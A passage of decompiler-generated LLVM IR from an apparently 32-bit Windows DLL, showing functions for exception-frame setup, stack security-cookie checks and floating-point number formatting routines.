  call void @__writefsdword(i32 0, i32 %18), !insn.addr !2001
  ret i32 %eax.0.reload, !insn.addr !2002
}

define i32 @function_100046f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100046f0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-16 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !2003
  store i32 %1, i32* %stack_var_-16, align 4, !insn.addr !2004
  %2 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2005
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !2006
  %3 = inttoptr i32 %0 to i32*, !insn.addr !2007
  store i32 %arg1, i32* %3, align 4, !insn.addr !2007
  %4 = inttoptr i32 %arg1 to i32*, !insn.addr !2008
  %5 = load i32, i32* %4, align 4, !insn.addr !2008
  %6 = add i32 %5, 4, !insn.addr !2009
  %7 = inttoptr i32 %6 to i32*, !insn.addr !2009
  %8 = load i32, i32* %7, align 4, !insn.addr !2009
  %9 = add i32 %arg1, 12, !insn.addr !2010
  %10 = add i32 %9, %8, !insn.addr !2010
  %11 = inttoptr i32 %10 to i32*, !insn.addr !2010
  %12 = load i32, i32* %11, align 4, !insn.addr !2010
  %13 = icmp eq i32 %12, 0, !insn.addr !2010
  %14 = zext i1 %13 to i8, !insn.addr !2011
  %15 = add i32 %0, 4, !insn.addr !2012
  %16 = inttoptr i32 %15 to i8*, !insn.addr !2012
  store i8 %14, i8* %16, align 1, !insn.addr !2012
  %17 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2013
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !2014
  ret i32 %0, !insn.addr !2015
}

define i32 @function_10004780(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) {
dec_label_pc_10004780:
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-80 = alloca i32, align 4
  %1 = call i32 @function_10001150(i32* nonnull %stack_var_-80, i32 64, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1003937c, i32 0, i32 0)), !insn.addr !2016
  %2 = call i32 @function_10005590(i32 %0, i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32* nonnull %stack_var_-80, i32 %1), !insn.addr !2017
  %3 = call i32 @"@__security_check_cookie@4"(), !insn.addr !2018
  ret i32 %3, !insn.addr !2019
}

define i32 @function_100047f0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i64 %arg6) {
dec_label_pc_100047f0:
  %esp.1.in.reg2mem = alloca i32*, !insn.addr !2020
  %ecx.1.reg2mem = alloca i32, !insn.addr !2020
  %ecx.0.reg2mem = alloca i32, !insn.addr !2020
  %stack_var_-56.0.reg2mem = alloca i32, !insn.addr !2020
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-52 = alloca i8, align 1
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !2021
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !2022
  store i32 %1, i32* %stack_var_-16, align 4, !insn.addr !2023
  %2 = load i32, i32* @global_var_1003d070, align 4, !insn.addr !2024
  %3 = xor i32 %2, %0, !insn.addr !2025
  store i32 %3, i32* %stack_var_-88, align 4, !insn.addr !2026
  %4 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2027
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2028
  store i8 0, i8* %stack_var_-52, align 1, !insn.addr !2029
  %5 = add i32 %arg4, 20, !insn.addr !2030
  %6 = inttoptr i32 %5 to i32*, !insn.addr !2030
  %7 = load i32, i32* %6, align 4, !insn.addr !2030
  %8 = add i32 %arg4, 24, !insn.addr !2031
  %9 = inttoptr i32 %8 to i32*, !insn.addr !2031
  %10 = load i32, i32* %9, align 4, !insn.addr !2031
  %11 = and i32 %7, 12288, !insn.addr !2032
  %12 = add i32 %arg4, 28, !insn.addr !2033
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2033
  %14 = load i32, i32* %13, align 4, !insn.addr !2033
  %15 = icmp eq i32 %14, 0, !insn.addr !2034
  %16 = icmp slt i32 %14, 0, !insn.addr !2034
  %17 = icmp eq i1 %16, false, !insn.addr !2035
  %18 = icmp eq i1 %15, false, !insn.addr !2035
  %19 = icmp eq i1 %17, %18, !insn.addr !2035
  store i32 %10, i32* %stack_var_-56.0.reg2mem, !insn.addr !2035
  store i32 %14, i32* %ecx.0.reg2mem, !insn.addr !2035
  br i1 %19, label %dec_label_pc_10004868, label %dec_label_pc_10004851, !insn.addr !2035

dec_label_pc_10004851:                            ; preds = %dec_label_pc_100047f0
  %20 = icmp eq i32 %10, 0, !insn.addr !2036
  %21 = or i1 %20, %16
  %22 = icmp eq i1 %21, false
  %23 = icmp eq i32 %11, 8192, !insn.addr !2037
  %or.cond3 = or i1 %23, %22
  %spec.select = select i1 %or.cond3, i32 %10, i32 6
  %spec.select4 = select i1 %or.cond3, i32 %14, i32 0
  store i32 %spec.select, i32* %stack_var_-56.0.reg2mem
  store i32 %spec.select4, i32* %ecx.0.reg2mem
  br label %dec_label_pc_10004868

dec_label_pc_10004868:                            ; preds = %dec_label_pc_10004851, %dec_label_pc_100047f0
  %stack_var_-56.0.reload = load i32, i32* %stack_var_-56.0.reg2mem
  %24 = icmp eq i32 %11, 8192, !insn.addr !2038
  %25 = icmp eq i1 %24, false, !insn.addr !2039
  store i32 %stack_var_-56.0.reload, i32* %ecx.1.reg2mem, !insn.addr !2039
  br i1 %25, label %dec_label_pc_100048ca, label %dec_label_pc_10004874, !insn.addr !2039

dec_label_pc_10004874:                            ; preds = %dec_label_pc_10004868
  %26 = call i128 @__asm_movsd.43(i64 %arg6), !insn.addr !2040
  %27 = call i128 @__asm_movaps(i128 %26), !insn.addr !2041
  %28 = load i128, i128* @global_var_10039c90, align 4, !insn.addr !2042
  %29 = call i128 @__asm_andps(i128 %27, i128 %28), !insn.addr !2042
  %30 = load i128, i128* @global_var_100398d8, align 4, !insn.addr !2043
  call void @__asm_comisd(i128 %29, i128 %30), !insn.addr !2043
  %31 = icmp ult i32 %11, 8193
  store i32 %stack_var_-56.0.reload, i32* %ecx.1.reg2mem, !insn.addr !2044
  br i1 %31, label %dec_label_pc_100048ca, label %dec_label_pc_1000488d, !insn.addr !2044

dec_label_pc_1000488d:                            ; preds = %dec_label_pc_10004874
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %32 = call i32 @__asm_movsd.44(i128 %26), !insn.addr !2045
  %33 = sext i32 %32 to i64, !insn.addr !2045
  %34 = bitcast i64 %33 to double, !insn.addr !2045
  %35 = call double @_frexp(double %34, i32* nonnull @1), !insn.addr !2046
  %36 = icmp slt i32 %ecx.0.reload, 0
  %37 = sub i32 0, %ecx.0.reload
  %38 = select i1 %36, i32 %37, i32 %ecx.0.reload, !insn.addr !2047
  %39 = mul i32 %38, 30103, !insn.addr !2048
  %40 = sext i32 %39 to i64, !insn.addr !2049
  %41 = mul nsw i64 %40, 351843721, !insn.addr !2049
  %42 = udiv i64 %41, 4294967296, !insn.addr !2049
  %43 = trunc i64 %42 to i32, !insn.addr !2049
  %44 = sdiv i32 %43, 8192, !insn.addr !2050
  %45 = lshr i32 %44, 31, !insn.addr !2051
  %46 = add i32 %44, %stack_var_-56.0.reload, !insn.addr !2052
  %47 = add i32 %46, %45, !insn.addr !2053
  store i32 %47, i32* %ecx.1.reg2mem, !insn.addr !2053
  br label %dec_label_pc_100048ca, !insn.addr !2053

dec_label_pc_100048ca:                            ; preds = %dec_label_pc_1000488d, %dec_label_pc_10004874, %dec_label_pc_10004868
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %48 = add i32 %ecx.1.reload, 50, !insn.addr !2054
  %49 = icmp eq i32 %48, 0
  br i1 %49, label %dec_label_pc_100048d1, label %dec_label_pc_100048e4, !insn.addr !2055

dec_label_pc_100048d1:                            ; preds = %dec_label_pc_100048ca
  store i8 0, i8* %stack_var_-52, align 1, !insn.addr !2056
  store i32* %stack_var_-88, i32** %esp.1.in.reg2mem, !insn.addr !2057
  br label %dec_label_pc_100048f1, !insn.addr !2057

dec_label_pc_100048e4:                            ; preds = %dec_label_pc_100048ca
  store i32 %48, i32* %stack_var_-96, align 4, !insn.addr !2058
  %50 = call i32 @function_10004360(i32 %48, i32 0), !insn.addr !2059
  store i32* %stack_var_-96, i32** %esp.1.in.reg2mem, !insn.addr !2059
  br label %dec_label_pc_100048f1, !insn.addr !2059

dec_label_pc_100048f1:                            ; preds = %dec_label_pc_100048e4, %dec_label_pc_100048d1
  %esp.1.in.reload = load i32*, i32** %esp.1.in.reg2mem
  %.pre-phi = ptrtoint i8* %stack_var_-52 to i32
  %esp.1 = ptrtoint i32* %esp.1.in.reload to i32
  %51 = call i128 @__asm_movsd.43(i64 %arg6), !insn.addr !2060
  %52 = add i32 %esp.1, -8, !insn.addr !2061
  %53 = call i32 @__asm_movsd.44(i128 %51), !insn.addr !2062
  %54 = sext i32 %53 to i64, !insn.addr !2062
  %55 = inttoptr i32 %52 to i64*, !insn.addr !2062
  store i64 %54, i64* %55, align 4, !insn.addr !2062
  %56 = add i32 %esp.1, -12, !insn.addr !2063
  %57 = inttoptr i32 %56 to i32*, !insn.addr !2063
  store i32 %stack_var_-56.0.reload, i32* %57, align 4, !insn.addr !2063
  %58 = load i32, i32* %6, align 4, !insn.addr !2064
  %59 = add i32 %esp.1, -16, !insn.addr !2064
  %60 = inttoptr i32 %59 to i32*, !insn.addr !2064
  store i32 %58, i32* %60, align 4, !insn.addr !2064
  %61 = add i32 %esp.1, -20, !insn.addr !2065
  %62 = inttoptr i32 %61 to i32*, !insn.addr !2065
  store i32 76, i32* %62, align 4, !insn.addr !2065
  %63 = add i32 %esp.1, -24, !insn.addr !2066
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2066
  %65 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !2066
  store i32 %65, i32* %64, align 4, !insn.addr !2066
  %66 = add i32 %esp.1, -28, !insn.addr !2067
  %67 = inttoptr i32 %66 to i32*, !insn.addr !2067
  %68 = call i32 @function_10005e20(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !2068
  store i32 %68, i32* %60, align 4, !insn.addr !2069
  store i32 0, i32* %62, align 4, !insn.addr !2070
  store i32 %.pre-phi, i32* %64, align 4, !insn.addr !2071
  %69 = call i32 @function_10001150(i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i8* bitcast (i32* @1 to i8*)), !insn.addr !2072
  store i32 %69, i32* %67, align 4, !insn.addr !2073
  %70 = add i32 %esp.1, -32, !insn.addr !2074
  %71 = inttoptr i32 %70 to i32*, !insn.addr !2074
  store i32 %.pre-phi, i32* %71, align 4, !insn.addr !2074
  %72 = add i32 %esp.1, -36, !insn.addr !2075
  %73 = inttoptr i32 %72 to i32*, !insn.addr !2075
  store i32 %arg5, i32* %73, align 4, !insn.addr !2075
  %74 = add i32 %esp.1, -40, !insn.addr !2076
  %75 = inttoptr i32 %74 to i32*, !insn.addr !2076
  store i32 %arg4, i32* %75, align 4, !insn.addr !2076
  %76 = add i32 %esp.1, -44, !insn.addr !2077
  %77 = inttoptr i32 %76 to i32*, !insn.addr !2077
  store i32 %arg3, i32* %77, align 4, !insn.addr !2077
  %78 = add i32 %esp.1, -48, !insn.addr !2078
  %79 = inttoptr i32 %78 to i32*, !insn.addr !2078
  store i32 %arg2, i32* %79, align 4, !insn.addr !2078
  %80 = add i32 %esp.1, -52, !insn.addr !2079
  %81 = inttoptr i32 %80 to i32*, !insn.addr !2079
  store i32 %arg1, i32* %81, align 4, !insn.addr !2079
  %82 = add i32 %esp.1, -56, !insn.addr !2080
  %83 = inttoptr i32 %82 to i32*, !insn.addr !2080
  %84 = call i32 @function_100059f0(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !2081
  %85 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2082
  call void @__writefsdword(i32 0, i32 %85), !insn.addr !2083
  %86 = call i32 @"@__security_check_cookie@4"(), !insn.addr !2084
  ret i32 %86, !insn.addr !2085
}

define i32 @function_100049c0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i64 %arg6) {
dec_label_pc_100049c0:
  %esp.1.in.reg2mem = alloca i32*, !insn.addr !2086
  %ecx.1.reg2mem = alloca i32, !insn.addr !2086
  %ecx.0.reg2mem = alloca i32, !insn.addr !2086
  %stack_var_-56.0.reg2mem = alloca i32, !insn.addr !2086
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-52 = alloca i8, align 1
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !2087
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !2088
  store i32 %1, i32* %stack_var_-16, align 4, !insn.addr !2089
  %2 = load i32, i32* @global_var_1003d070, align 4, !insn.addr !2090
  %3 = xor i32 %2, %0, !insn.addr !2091
  store i32 %3, i32* %stack_var_-88, align 4, !insn.addr !2092
  %4 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2093
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2094
  store i8 0, i8* %stack_var_-52, align 1, !insn.addr !2095
  %5 = add i32 %arg4, 20, !insn.addr !2096
  %6 = inttoptr i32 %5 to i32*, !insn.addr !2096
  %7 = load i32, i32* %6, align 4, !insn.addr !2096
  %8 = add i32 %arg4, 24, !insn.addr !2097
  %9 = inttoptr i32 %8 to i32*, !insn.addr !2097
  %10 = load i32, i32* %9, align 4, !insn.addr !2097
  %11 = and i32 %7, 12288, !insn.addr !2098
  %12 = add i32 %arg4, 28, !insn.addr !2099
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2099
  %14 = load i32, i32* %13, align 4, !insn.addr !2099
  %15 = icmp eq i32 %14, 0, !insn.addr !2100
  %16 = icmp slt i32 %14, 0, !insn.addr !2100
  %17 = icmp eq i1 %16, false, !insn.addr !2101
  %18 = icmp eq i1 %15, false, !insn.addr !2101
  %19 = icmp eq i1 %17, %18, !insn.addr !2101
  store i32 %10, i32* %stack_var_-56.0.reg2mem, !insn.addr !2101
  store i32 %14, i32* %ecx.0.reg2mem, !insn.addr !2101
  br i1 %19, label %dec_label_pc_10004a38, label %dec_label_pc_10004a21, !insn.addr !2101

dec_label_pc_10004a21:                            ; preds = %dec_label_pc_100049c0
  %20 = icmp eq i32 %10, 0, !insn.addr !2102
  %21 = or i1 %20, %16
  %22 = icmp eq i1 %21, false
  %23 = icmp eq i32 %11, 8192, !insn.addr !2103
  %or.cond3 = or i1 %23, %22
  %spec.select = select i1 %or.cond3, i32 %10, i32 6
  %spec.select4 = select i1 %or.cond3, i32 %14, i32 0
  store i32 %spec.select, i32* %stack_var_-56.0.reg2mem
  store i32 %spec.select4, i32* %ecx.0.reg2mem
  br label %dec_label_pc_10004a38

dec_label_pc_10004a38:                            ; preds = %dec_label_pc_10004a21, %dec_label_pc_100049c0
  %stack_var_-56.0.reload = load i32, i32* %stack_var_-56.0.reg2mem
  %24 = icmp eq i32 %11, 8192, !insn.addr !2104
  %25 = icmp eq i1 %24, false, !insn.addr !2105
  store i32 %stack_var_-56.0.reload, i32* %ecx.1.reg2mem, !insn.addr !2105
  br i1 %25, label %dec_label_pc_10004a9a, label %dec_label_pc_10004a44, !insn.addr !2105

dec_label_pc_10004a44:                            ; preds = %dec_label_pc_10004a38
  %26 = call i128 @__asm_movsd.43(i64 %arg6), !insn.addr !2106
  %27 = call i128 @__asm_movaps(i128 %26), !insn.addr !2107
  %28 = load i128, i128* @global_var_10039c90, align 4, !insn.addr !2108
  %29 = call i128 @__asm_andps(i128 %27, i128 %28), !insn.addr !2108
  %30 = load i128, i128* @global_var_100398d8, align 4, !insn.addr !2109
  call void @__asm_comisd(i128 %29, i128 %30), !insn.addr !2109
  %31 = icmp ult i32 %11, 8193
  store i32 %stack_var_-56.0.reload, i32* %ecx.1.reg2mem, !insn.addr !2110
  br i1 %31, label %dec_label_pc_10004a9a, label %dec_label_pc_10004a5d, !insn.addr !2110

dec_label_pc_10004a5d:                            ; preds = %dec_label_pc_10004a44
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %32 = call i32 @__asm_movsd.44(i128 %26), !insn.addr !2111
  %33 = sext i32 %32 to i64, !insn.addr !2111
  %34 = bitcast i64 %33 to double, !insn.addr !2111
  %35 = call double @_frexp(double %34, i32* nonnull @1), !insn.addr !2112
  %36 = icmp slt i32 %ecx.0.reload, 0
  %37 = sub i32 0, %ecx.0.reload
  %38 = select i1 %36, i32 %37, i32 %ecx.0.reload, !insn.addr !2113
  %39 = mul i32 %38, 30103, !insn.addr !2114
  %40 = sext i32 %39 to i64, !insn.addr !2115
  %41 = mul nsw i64 %40, 351843721, !insn.addr !2115
  %42 = udiv i64 %41, 4294967296, !insn.addr !2115
  %43 = trunc i64 %42 to i32, !insn.addr !2115
  %44 = sdiv i32 %43, 8192, !insn.addr !2116
  %45 = lshr i32 %44, 31, !insn.addr !2117
  %46 = add i32 %44, %stack_var_-56.0.reload, !insn.addr !2118
  %47 = add i32 %46, %45, !insn.addr !2119
  store i32 %47, i32* %ecx.1.reg2mem, !insn.addr !2119
  br label %dec_label_pc_10004a9a, !insn.addr !2119

dec_label_pc_10004a9a:                            ; preds = %dec_label_pc_10004a5d, %dec_label_pc_10004a44, %dec_label_pc_10004a38
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %48 = add i32 %ecx.1.reload, 50, !insn.addr !2120
  %49 = icmp eq i32 %48, 0
  br i1 %49, label %dec_label_pc_10004aa1, label %dec_label_pc_10004ab4, !insn.addr !2121

dec_label_pc_10004aa1:                            ; preds = %dec_label_pc_10004a9a
  store i8 0, i8* %stack_var_-52, align 1, !insn.addr !2122
  store i32* %stack_var_-88, i32** %esp.1.in.reg2mem, !insn.addr !2123
  br label %dec_label_pc_10004ac1, !insn.addr !2123

dec_label_pc_10004ab4:                            ; preds = %dec_label_pc_10004a9a
  store i32 %48, i32* %stack_var_-96, align 4, !insn.addr !2124
  %50 = call i32 @function_10004360(i32 %48, i32 0), !insn.addr !2125
  store i32* %stack_var_-96, i32** %esp.1.in.reg2mem, !insn.addr !2125
  br label %dec_label_pc_10004ac1, !insn.addr !2125

dec_label_pc_10004ac1:                            ; preds = %dec_label_pc_10004ab4, %dec_label_pc_10004aa1
  %esp.1.in.reload = load i32*, i32** %esp.1.in.reg2mem
  %.pre-phi = ptrtoint i8* %stack_var_-52 to i32
  %esp.1 = ptrtoint i32* %esp.1.in.reload to i32
  %51 = call i128 @__asm_movsd.43(i64 %arg6), !insn.addr !2126
  %52 = add i32 %esp.1, -8, !insn.addr !2127
  %53 = call i32 @__asm_movsd.44(i128 %51), !insn.addr !2128
  %54 = sext i32 %53 to i64, !insn.addr !2128
  %55 = inttoptr i32 %52 to i64*, !insn.addr !2128
  store i64 %54, i64* %55, align 4, !insn.addr !2128
  %56 = add i32 %esp.1, -12, !insn.addr !2129
  %57 = inttoptr i32 %56 to i32*, !insn.addr !2129
  store i32 %stack_var_-56.0.reload, i32* %57, align 4, !insn.addr !2129
  %58 = load i32, i32* %6, align 4, !insn.addr !2130
  %59 = add i32 %esp.1, -16, !insn.addr !2130
  %60 = inttoptr i32 %59 to i32*, !insn.addr !2130
  store i32 %58, i32* %60, align 4, !insn.addr !2130
  %61 = add i32 %esp.1, -20, !insn.addr !2131
  %62 = inttoptr i32 %61 to i32*, !insn.addr !2131
  store i32 0, i32* %62, align 4, !insn.addr !2131
  %63 = add i32 %esp.1, -24, !insn.addr !2132
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2132
  %65 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !2132
  store i32 %65, i32* %64, align 4, !insn.addr !2132
  %66 = add i32 %esp.1, -28, !insn.addr !2133
  %67 = inttoptr i32 %66 to i32*, !insn.addr !2133
  %68 = call i32 @function_10005e20(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !2134
  store i32 %68, i32* %60, align 4, !insn.addr !2135
  store i32 0, i32* %62, align 4, !insn.addr !2136
  store i32 %.pre-phi, i32* %64, align 4, !insn.addr !2137
  %69 = call i32 @function_10001150(i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i8* bitcast (i32* @1 to i8*)), !insn.addr !2138
  store i32 %69, i32* %67, align 4, !insn.addr !2139
  %70 = add i32 %esp.1, -32, !insn.addr !2140
  %71 = inttoptr i32 %70 to i32*, !insn.addr !2140
  store i32 %.pre-phi, i32* %71, align 4, !insn.addr !2140
  %72 = add i32 %esp.1, -36, !insn.addr !2141
  %73 = inttoptr i32 %72 to i32*, !insn.addr !2141
  store i32 %arg5, i32* %73, align 4, !insn.addr !2141
  %74 = add i32 %esp.1, -40, !insn.addr !2142
  %75 = inttoptr i32 %74 to i32*, !insn.addr !2142
  store i32 %arg4, i32* %75, align 4, !insn.addr !2142
  %76 = add i32 %esp.1, -44, !insn.addr !2143
  %77 = inttoptr i32 %76 to i32*, !insn.addr !2143
  store i32 %arg3, i32* %77, align 4, !insn.addr !2143
  %78 = add i32 %esp.1, -48, !insn.addr !2144
  %79 = inttoptr i32 %78 to i32*, !insn.addr !2144
  store i32 %arg2, i32* %79, align 4, !insn.addr !2144
  %80 = add i32 %esp.1, -52, !insn.addr !2145
  %81 = inttoptr i32 %80 to i32*, !insn.addr !2145
  store i32 %arg1, i32* %81, align 4, !insn.addr !2145
  %82 = add i32 %esp.1, -56, !insn.addr !2146
  %83 = inttoptr i32 %82 to i32*, !insn.addr !2146
  %84 = call i32 @function_100059f0(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !2147
  %85 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2148
  call void @__writefsdword(i32 0, i32 %85), !insn.addr !2149
  %86 = call i32 @"@__security_check_cookie@4"(), !insn.addr !2150
  ret i32 %86, !insn.addr !2151
}

define i32 @function_10004b90(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) {
dec_label_pc_10004b90:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %4 = add i32 %arg4, 20, !insn.addr !2152
  %5 = inttoptr i32 %4 to i32*, !insn.addr !2152
  %6 = load i32, i32* %5, align 4, !insn.addr !2152
  %7 = call i32 @function_10005960(i32 %3, i32* nonnull %stack_var_-88, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10039380, i32 0, i32 0), i32 %6, i32 %arg6, i32 %arg7, i32 %0, i32 %1, i32 %2), !insn.addr !2153
  %8 = inttoptr i32 %7 to i8*, !insn.addr !2154
  %9 = call i32 @function_10001150(i32* nonnull %stack_var_-80, i32 64, i8* %8), !insn.addr !2154
  %10 = call i32 @function_10005590(i32 %3, i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32* nonnull %stack_var_-80, i32 %9), !insn.addr !2155
  %11 = call i32 @"@__security_check_cookie@4"(), !insn.addr !2156
  ret i32 %11, !insn.addr !2157
}

define i32 @function_10004c10(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) {
dec_label_pc_10004c10:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %4 = add i32 %arg4, 20, !insn.addr !2158
  %5 = inttoptr i32 %4 to i32*, !insn.addr !2158
  %6 = load i32, i32* %5, align 4, !insn.addr !2158
  %7 = call i32 @function_10005960(i32 %3, i32* nonnull %stack_var_-88, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10039384, i32 0, i32 0), i32 %6, i32 %arg6, i32 %arg7, i32 %0, i32 %1, i32 %2), !insn.addr !2159
  %8 = inttoptr i32 %7 to i8*, !insn.addr !2160
  %9 = call i32 @function_10001150(i32* nonnull %stack_var_-80, i32 64, i8* %8), !insn.addr !2160
  %10 = call i32 @function_10005590(i32 %3, i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32* nonnull %stack_var_-80, i32 %9), !insn.addr !2161
  %11 = call i32 @"@__security_check_cookie@4"(), !insn.addr !2162
  ret i32 %11, !insn.addr !2163
}

define i32 @function_10004c90(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) {
dec_label_pc_10004c90:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %4 = add i32 %arg4, 20, !insn.addr !2164
  %5 = inttoptr i32 %4 to i32*, !insn.addr !2164
  %6 = load i32, i32* %5, align 4, !insn.addr !2164
  %7 = call i32 @function_10005960(i32 %3, i32* nonnull %stack_var_-88, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10039388, i32 0, i32 0), i32 %6, i32 %arg6, i32 %0, i32 %1, i32 %2, i32 ptrtoint (i32* @1 to i32)), !insn.addr !2165
  %8 = inttoptr i32 %7 to i8*, !insn.addr !2166
  %9 = call i32 @function_10001150(i32* nonnull %stack_var_-80, i32 64, i8* %8), !insn.addr !2167
  %10 = call i32 @function_10005590(i32 %3, i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32* nonnull %stack_var_-80, i32 %9), !insn.addr !2168
  %11 = call i32 @"@__security_check_cookie@4"(), !insn.addr !2169
  ret i32 %11, !insn.addr !2170
}

define i32 @function_10004d10(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) {
dec_label_pc_10004d10:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = call i32 @__decompiler_undefined_function_1()
  %3 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %4 = add i32 %arg4, 20, !insn.addr !2171
  %5 = inttoptr i32 %4 to i32*, !insn.addr !2171
  %6 = load i32, i32* %5, align 4, !insn.addr !2171
  %7 = call i32 @function_10005960(i32 %3, i32* nonnull %stack_var_-88, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1003938c, i32 0, i32 0), i32 %6, i32 %arg6, i32 %0, i32 %1, i32 %2, i32 ptrtoint (i32* @1 to i32)), !insn.addr !2172
  %8 = inttoptr i32 %7 to i8*, !insn.addr !2173
  %9 = call i32 @function_10001150(i32* nonnull %stack_var_-80, i32 64, i8* %8), !insn.addr !2174
  %10 = call i32 @function_10005590(i32 %3, i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32* nonnull %stack_var_-80, i32 %9), !insn.addr !2175
  %11 = call i32 @"@__security_check_cookie@4"(), !insn.addr !2176
  ret i32 %11, !insn.addr !2177
}

define i32 @function_10004d90(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i8 %arg6) {
dec_label_pc_10004d90:
  %edi.0.reg2mem = alloca i32, !insn.addr !2178
  %edx.0.reg2mem = alloca i32, !insn.addr !2178
  %ecx.0.reg2mem = alloca i32, !insn.addr !2178
  %.pre-phi12.reg2mem = alloca i32*, !insn.addr !2178
  %.pre-phi16.reg2mem = alloca i32*, !insn.addr !2178
  %.pre-phi20.reg2mem = alloca i32*, !insn.addr !2178
  %.pre-phi24.reg2mem = alloca i32*, !insn.addr !2178
  %.pre-phi28.reg2mem = alloca i32*, !insn.addr !2178
  %.pre-phi30.reg2mem = alloca i32, !insn.addr !2178
  %storemerge.reg2mem = alloca i32, !insn.addr !2178
  %storemerge5.reg2mem = alloca i32, !insn.addr !2178
  %esp.0.reg2mem = alloca i32, !insn.addr !2178
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-44 = alloca i128, align 8
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-112 = alloca i8, align 1
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !2179
  store i32 %1, i32* %stack_var_-16, align 4, !insn.addr !2180
